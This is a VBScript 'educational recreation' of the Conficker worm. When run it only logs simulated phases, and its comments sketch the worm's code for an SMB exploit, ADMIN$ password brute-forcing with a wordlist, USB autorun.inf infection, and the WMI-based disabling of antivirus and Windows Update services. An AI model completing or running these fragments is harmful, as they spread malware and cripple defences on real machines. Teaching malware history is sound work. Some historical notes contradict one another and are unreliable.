' ============================================================================
' EDUCATIONAL RECREATION - CONFICKER WORM (2008)
' ============================================================================
' ALIAS: Downup, Downadup, Kido
' FIRST SEEN: November 2008
' TYPE: Network Worm / Botnet
' PLATFORM: Windows (exploiting MS08-067 vulnerability)
' IMPACT: Infected 9-15 million computers across 190+ countries
'
' ⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT EXECUTE ⚠️
' ============================================================================
'
' HOW CONFICKER WORKED (High-Level Overview):
' ============================================
' 1. EXPLOITED MS08-067: A Windows Server Service buffer overflow vulnerability
' 2. DOWNLOADED ADDITIONAL PAYLOAD from random URLs (pre-registered domains)
' 3. SPREAD VIA:
'    a. Network shares with weak passwords (SMB brute-force)
'    b. Removable drives (USB autorun.inf)
'    c. Peer-to-peer communication (P2P botnet for variant C+)
' 4. DISABLED SECURITY: Turned off Windows Update, antivirus, security services
' 5. CREATED BOTNET: Formed massive distributed network for command & control
'
' TECHNICAL BREAKDOWN:
' ===================
' Conficker was a sophisticated worm that combined multiple propagation methods.
' This recreation demonstrates the core mechanisms with SAFETY MODIFICATIONS:
' - Network exploitation (SIMULATED - no actual network scanning)
' - Password brute-forcing (SIMULATED - no actual credential testing)
' - Service disabling (SIMULATED - no actual service modification)
' - Domain generation algorithm (SIMULATED - no actual DNS queries)
'
' ============================================================================

On Error Resume Next

' ============================================================================
' PHASE 1: MS08-067 Exploit Simulation
' ============================================================================
' Conficker exploited a critical vulnerability in the Windows Server Service
' (netapi32.dll). The vulnerability allowed remote code execution without
' authentication - a "wormable" vulnerability.
'
' CVE: CVE-2008-4250
' CVSS Score: 10.0 (Critical)
' Patched: October 2008 (MS08-067)
' ============================================================================

Sub ExploitMS08_067()
    LogAction "=== PHASE 1: MS08-067 Exploit Simulation ==="
    LogAction "TARGET: Windows Server Service (netapi32.dll)"
    LogAction "CVE: CVE-2008-4250"
    LogAction "TYPE: Buffer overflow in NetpwPathCanonicalize()"
    LogAction ""
    
    ' Original exploitation steps:
    ' 1. Connect to target machine on port 445 (SMB)
    ' 2. Call NetpwPathCanonicalize() with crafted buffer
    ' 3. Buffer overflow overwrites return address on stack
    ' 4. Redirects execution to shellcode in the request
    ' 5. Shellcode downloads and executes Conficker payload
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
    ' Set sock = CreateObject("MSWinsock.Winsock")
    ' sock.Connect targetIP, 445
    ' If sock.State = 7 Then ' Connected
    '     ' Send crafted RPC request to NetpwPathCanonicalize
    '     ' Buffer contains shellcode that downloads Conficker
    '     sock.SendData exploitPayload
    ' End If
    
    LogAction "SIMULATED: Would scan network for port 445 (SMB)"
    LogAction "SIMULATED: Would attempt NetpwPathCanonicalize() exploit"
    LogAction "SIMULATED: Would inject shellcode via buffer overflow"
    LogAction ""
    LogAction "NOTE: MS08-067 patch was available BEFORE Conficker spread"
    LogAction "NOTE: Most infections were on unpatched systems"
    LogAction ""
End Sub

' ============================================================================
' PHASE 2: Password Brute-Force via SMB
' ============================================================================
' If the MS08-067 exploit failed, Conficker tried to authenticate to
' network shares using common passwords. It used a built-in dictionary
' of weak passwords to guess admin credentials.
' ============================================================================

Sub BruteForceSMB()
    Dim targetIP, shareName, username
    Dim weakPasswords, i
    
    LogAction "=== PHASE 2: SMB Password Brute-Force Simulation ==="
    
    ' Built-in password dictionary (original used ~3000 common passwords)
    weakPasswords = Array("password", "123456", "admin", "administrator", _
                          "letmein", "welcome", "monkey", "dragon", _
                          "master", "qwerty", "login", "abc123", _
                          "password1", "passw0rd", "root", "test")
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
    ' For Each targetIP In networkRange
    '     shareName = "\\" & targetIP & "\ADMIN$"
    '     For i = 0 To UBound(weakPasswords)
    '         password = weakPasswords(i)
    '         ' Attempt to connect to ADMIN$ share
    '         ' If successful, copy Conficker to target and execute
    '         Set objNetwork = CreateObject("WScript.Network")
    '         ' objNetwork.MapNetworkDrive "Z:", shareName, False, _
    '         '     "Administrator", password
    '         ' If connection successful:
    '         '     fso.CopyFile WScript.ScriptFullName, "Z:\conficker.dll"
    '         '     ' Execute remotely via scheduled task or service
    '         '     objNetwork.RemoveNetworkDrive "Z:"
    '         ' End If
    '     Next
    ' Next
    
    LogAction "SIMULATED: Would scan network range for SMB shares"
    LogAction "SIMULATED: Would attempt authentication to ADMIN$ share"
    LogAction "PASSWORD DICTIONARY: " & UBound(weakPasswords) + 1 & " common passwords"
    LogAction "SAMPLE PASSWORDS: " & Join(SliceArray(weakPasswords, 5), ", ")
    LogAction ""
    LogAction "NOTE: Conficker's wordlist was hardcoded in the binary"
    LogAction "NOTE: Weak passwords allowed lateral movement even on patched systems"
    LogAction ""
End Sub

' ============================================================================
' PHASE 3: Removable Drive Infection (USB Autorun)
' ============================================================================
' Conficker spread via USB drives by creating an autorun.inf file that
' would execute the worm when the drive was inserted into a new machine.
' ============================================================================

Sub InfectUSBDrives()
    Dim fso, drives, drive
    
    LogAction "=== PHASE 3: USB Drive Infection Simulation ==="
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
    ' Set fso = CreateObject("Scripting.FileSystemObject")
    ' For Each drive In fso.Drives
    '     If drive.DriveType = 1 Then ' 1 = Removable drive
    '         ' Create autorun.inf to auto-execute on insert
    '         ' autorunFile = drive.DriveLetter & ":\autorun.inf"
    '         ' Set ts = fso.CreateTextFile(autorunFile, True)
    '         ' ts.WriteLine "[autorun]"
    '         ' ts.WriteLine "open=run" & drive.DriveLetter & ".dll"
    '         ' ts.WriteLine "shell\open\command=run" & drive.DriveLetter & ".dll"
    '         ' ts.Close
    '         '
    '         ' Hide the autorun and worm files
    '         ' SetAttr autorunFile, vbHidden + vbSystem
    '         ' fso.CopyFile WScript.ScriptFullName, _
    '         '     drive.DriveLetter & ":\run" & drive.DriveLetter & ".dll"
    '         ' SetAttr drive.DriveLetter & ":\run" & drive.DriveLetter & ".dll", _
    '         '     vbHidden + vbSystem
    '     End If
    ' Next
    
    LogAction "SIMULATED: Would scan for removable drives (USB)"
    LogAction "SIMULATED: Would create autorun.inf on each drive"
    LogAction "SIMULATED: Would copy worm binary as hidden system file"
    LogAction ""
    LogAction "autorun.inf would contain:"
    LogAction "  [autorun]"
    LogAction "  open=runX.dll"
    LogAction "  shell\open\command=runX.dll"
    LogAction ""
    LogAction "NOTE: Windows disabled autorun by default after XP SP2"
    LogAction "NOTE: USB autorun was a major infection vector before Windows 7"
    LogAction ""
End Sub

' ============================================================================
' PHASE 4: Security Service Disabling
' ============================================================================
' Conficker actively disabled security services to prevent detection
' and removal. It stopped antivirus, Windows Update, and security tools.
' ============================================================================

Sub DisableSecurityServices()
    Dim serviceList, serviceName
    
    LogAction "=== PHASE 4: Security Service Disabling Simulation ==="
    
    ' Target services that Conficker attempted to disable
    serviceList = Array("wuauserv", "BITS", "wscsvc", "ersvc", _
                        "SharedAccess", "Symantec*", "McAfee*", _
                        "avast!*", "avg*")
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
    ' Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    ' For Each serviceName In serviceList
    '     ' Find services matching the name pattern
    '     Set colServices = objWMIService.ExecQuery( _
    '         "SELECT * FROM Win32_Service WHERE Name LIKE '" & serviceName & "'")
    '     For Each objService In colServices
    '         ' Stop the service
    '         ' objService.StopService()
    '         ' Set startup type to Disabled
    '         ' objService.ChangeStartMode("Disabled")
    '     Next
    ' Next
    
    LogAction "SIMULATED: Would stop and disable the following services:"
    For Each serviceName In serviceList
        LogAction "  - " & serviceName
    Next
    LogAction ""
    LogAction "NOTE: This technique made removal difficult"
    LogAction "NOTE: Users couldn't download patches or run antivirus scans"
    LogAction ""
End Sub

' ============================================================================
' PHASE 5: Domain Generation Algorithm (DGA)
' ============================================================================
' Conficker used a Domain Generation Algorithm to create a list of
' possible command & control domains each day. This made it hard to
' block or takedown the C2 infrastructure.
'
' Variants B and C generated 250 domains per day
' Variant D generated 50,000 domains per day
' ============================================================================

Sub GenerateDGADomains()
    Dim currentDate, seed, domainList, i
    
    LogAction "=== PHASE 5: Domain Generation Algorithm Simulation ==="
    
    currentDate = Year(Now) & Right("0" & Month(Now), 2) & Right("0" & Day(Now), 2)
    seed = currentDate ' Date used as seed for DGA
    
    LogAction "SEED (Date): " & currentDate
    LogAction ""
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original DGA pattern:
    ' The algorithm used the date as a seed to generate pseudo-random domain names
    ' Variant B/C: 250 domains/day with .com, .net, .org, .info, .biz
    ' Variant D: 50,000 domains/day (much harder to block)
    
    ' Simulated DGA output
    LogAction "SIMULATED: Would generate 250 domains per day (Variant B/C)"
    LogAction "SIMULATED: Would attempt to contact each domain for C2 instructions"
    LogAction "SAMPLE GENERATED DOMAINS (simulated):"
    
    ' Generate fake domains to demonstrate the concept
    domainList = Array("a8f3k2j9.com", "x7m4p1q6.net", "b2n5r8t3.org", _
                       "w9c6v1h4.info", "d4g7j0l5.biz")
    For i = 0 To UBound(domainList)
        LogAction "  - " & domainList(i)
    Next
    LogAction ""
    LogAction "NOTE: Microsoft and security companies registered these domains"
    LogAction "NOTE: This allowed them to track Conficker infections globally"
    LogAction ""
End Sub

' ============================================================================
' PHASE 6: Peer-to-Peer Botnet (Variant C+)
' ============================================================================
' Conficker C+ added P2P communication so infected machines could
' receive updates even if the DGA domains were taken down.
' ============================================================================

Sub P2PBotnetCommunication()
    LogAction "=== PHASE 6: P2P Botnet Simulation ==="
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code pattern:
    ' Conficker P2P used a custom protocol over UDP port range
    ' Infected machines would:
    ' 1. Listen on specific UDP ports for incoming connections
    ' 2. Connect to other known infected machines
    ' 3. Exchange update payloads and C2 commands
    ' 4. Maintain a list of active peers
    
    LogAction "SIMULATED: Would listen on UDP ports for P2P connections"
    LogAction "SIMULATED: Would connect to known infected peers"
    LogAction "SIMULATED: Would exchange C2 commands and updates"
    LogAction "SIMULATED: Would maintain peer list for resilience"
    LogAction ""
    LogAction "NOTE: P2P made Conficker resilient to domain takedowns"
    LogAction "NOTE: Microsoft obtained a court order to disrupt the P2P network"
    LogAction ""
End Sub

' ============================================================================
' HELPER: Array slicing utility
' ============================================================================
Function SliceArray(arr, count)
    Dim result(), i
    ReDim result(count - 1)
    For i = 0 To count - 1
        result(i) = arr(i)
    Next
    SliceArray = result
End Function

' ============================================================================
' HELPER: Logging Function
' ============================================================================
Sub LogAction(message)
    Dim fso, logFile, logPath
    
    logPath = "conficker_educational_log.txt"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.OpenTextFile(logPath, 8, True)
    logFile.WriteLine "[" & Now & "] " & message
    logFile.Close
End Sub

' ============================================================================
' MAIN EXECUTION
' ============================================================================
Sub Main()
    LogAction "============================================"
    LogAction "EDUCATIONAL CONFICKER WORM DEMONSTRATION"
    LogAction "Date: " & Now
    LogAction "============================================"
    LogAction ""
    
    Call ExploitMS08_067()
    Call BruteForceSMB()
    Call InfectUSBDrives()
    Call DisableSecurityServices()
    Call GenerateDGADomains()
    Call P2PBotnetCommunication()
    
    LogAction "============================================"
    LogAction "DEMONSTRATION COMPLETE"
    LogAction "No actual harm was done - this is educational"
    LogAction "============================================"
End Sub

' Execute
Call Main()

' ============================================================================
' KEY VULNERABILITIES EXPLOITED:
' =============================
' 1. UNPATCHED SYSTEMS: MS08-067 patch available but not applied
' 2. WEAK PASSWORDS: Admin accounts with dictionary passwords
' 3. USB AUTORUN: Automatic execution from removable media
' 4. SECURITY SERVICE DISABLE: Disabled AV and Windows Update
' 5. DOMAIN GENERATION: Hard-to-block C2 infrastructure
'
' AFTERMATH & RESPONSE:
' ====================
' 1. Microsoft released MS08-067 patch in October 2008
' 2. Conficker Working Group formed (Microsoft, security companies)
' 3. $250,000 bounty offered for Conficker authors (unclaimed)
' 4. USB autorun disabled by default in Windows 7+
' 5. Estimated cleanup cost: $9 billion+ globally
' ============================================================================
